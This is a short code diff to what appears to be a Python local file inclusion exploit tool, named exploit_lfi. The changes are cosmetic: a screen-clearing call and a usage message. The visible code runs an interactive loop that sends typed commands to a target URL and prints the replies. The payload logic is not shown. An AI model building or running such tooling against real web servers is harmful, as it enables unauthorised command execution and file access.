@@ -18,12 +18,14 @@ def exploit_lfi(url):
         if command.lower() == 'exit':
             break
         elif command.lower() == 'clear':
-            os.system('clear')
+            clear_screen()
             continue
         response = send_request(url, command)
         print(response)
 
 if __name__ == '__main__':
     clear_screen()
+    if len(sys.argv) != 2:
+        print('Use: python3 app.py <Full-URL>')
     url = sys.argv[1]
     exploit_lfi(url)
